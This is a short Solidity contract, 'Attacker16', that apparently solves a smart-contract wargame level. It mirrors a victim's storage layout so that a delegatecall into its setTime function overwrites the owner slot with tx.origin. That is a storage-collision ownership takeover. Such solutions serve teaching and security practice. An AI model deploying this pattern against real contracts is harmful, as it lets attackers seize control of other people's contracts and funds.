// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Attacker16 {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        owner = tx.origin;
    }
}
